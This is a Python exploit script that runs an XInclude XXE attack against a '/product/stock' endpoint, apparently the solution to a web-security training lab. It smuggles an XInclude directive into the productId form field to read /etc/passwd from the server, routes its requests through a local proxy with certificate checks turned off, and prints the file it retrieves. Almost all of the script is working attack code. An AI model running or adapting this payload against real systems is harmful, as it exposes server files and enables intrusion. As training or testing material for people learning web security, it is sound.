import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_etc_passwd_file(url, session):
    stock_url = url + "/product/stock"
    data_stock = {
        'productId': (
            '1<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///etc/passwd"/>'
            '</foo>'
        ),
        'storeId': '1'
    }
    response = session.post(
        stock_url,
        data=data_stock,
        verify=False,
        proxies=proxies
    )
    return response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting XXE attack...")
        etc_passwd_file = get_etc_passwd_file(url, session)
        print(etc_passwd_file)
        print("[+] XXE Attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The XXE attack was not successful.")
        sys.exit(FAIL) 